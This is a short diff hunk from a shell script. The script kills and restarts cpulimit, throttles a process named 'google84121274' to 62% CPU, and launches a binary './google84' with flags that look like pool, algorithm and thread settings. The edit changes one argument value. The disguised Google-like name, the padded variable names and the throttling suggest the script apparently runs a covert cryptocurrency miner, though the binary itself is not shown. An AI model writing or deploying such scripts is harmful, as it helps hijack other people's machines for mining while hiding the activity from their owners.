@@ -121,7 +121,7 @@ pkill -f cpulimit
 
 cpulimit -e google84121274 -l 62 &> /dev/null &
 
-./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b $googlelinux8474
+./google84 -p $google841212121274 -a $google84121212121212121274 -t 1 -b 8
 
 fi
 
